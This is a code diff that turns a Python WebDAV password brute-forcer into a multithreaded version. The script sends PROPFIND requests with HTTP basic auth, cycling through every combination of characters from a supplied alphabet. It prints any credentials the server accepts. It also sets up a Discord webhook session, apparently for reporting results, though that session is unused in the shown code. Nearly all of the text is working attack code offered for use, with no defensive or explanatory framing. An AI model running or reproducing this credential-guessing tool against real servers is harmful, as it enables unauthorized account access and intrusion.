@@ -15,6 +15,7 @@ import base64
 import itertools
 import string
 import threading
+import time
 
 import requests
 
@@ -63,60 +64,75 @@ parser.add_argument(
 )
 
 
+# get command line args
 args = parser.parse_args()
 
 
+# decode letters
+letters = base64.b64decode(args.b64_letters).decode()
+
+# get index directory path
+if args.url.endswith("/"):
+    url = f"{args.url}."
+else:
+    url = f"{args.url}/."
+
+# create webhook session
 discord = requests.session()
 
+# create WEBDAV session
 dav = requests.session()
 dav.headers = {
     "User-Agent": args.user_agent
 }
 
 
-def brute_force() -> requests.Response:
-    i = 0
-    while True:
-        i += 1
+class WEBDAV:
+    def __init__(self):
+        self.stop = False
 
-        for j in map(
-            "".join,
-            itertools.product(
-                base64.b64decode(
-                    args.b64_letters
-                ).decode(),
-                repeat=i + 1
-            )
-        ):
+    def run(self):
+        i = 0
+        while True:
+            for j in [""] if i == 0 else map("".join, itertools.product(letters, repeat=i)):
+                while True:
+                    if self.stop:
+                        return
+                    if threading.active_count() < args.threads + 1:
+                        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {j} ..")
+                        threading.Thread(target=self.brute_force, daemon=True, args=(j,)).start()
+                        break
+                    time.sleep(0.1)
+            i += 1
 
-            print(j)
-
-            r = dav.request(
-                "PROPFIND",
-                args.url,
-                headers={
-                    "Depth": "1"
-                },
-                auth=(
-                    args.username,
-                    j
+    def brute_force(self, start):
+        for i in range(2):
+            for j in map("".join, itertools.product(letters, repeat=i + 1)):
+                # check for rights
+                r = dav.request(
+                    "PROPFIND",
+                    url,
+                    headers={
+                        "Depth": "1"
+                    },
+                    auth=(
+                        args.username,
+                        f"{start}{j}"
+                    )
                 )
-            )
+                # evaluate the response of the server
+                if r.status_code != 401:
+                    print("-" * 80)
+                    print(r.text)
+                    print("-" * 80)
+                    print(r.status_code)
+                    print("-" * 80)
+                    print(r.headers)
+                    print("-" * 80)
+                    print(f"USER: {args.username}")
+                    print(f"PASSWORD: {start}{j}")
+                    self.stop = True
 
-            if r.status_code != 401:
-                return r
 
-
-r = brute_force()
-
-print("-" * 80)
-
-print(r.text)
-
-print("-" * 80)
-
-print(r.status_code)
-
-print("-" * 80)
-
-print(r.headers)
+webdav = WEBDAV()
+webdav.run()
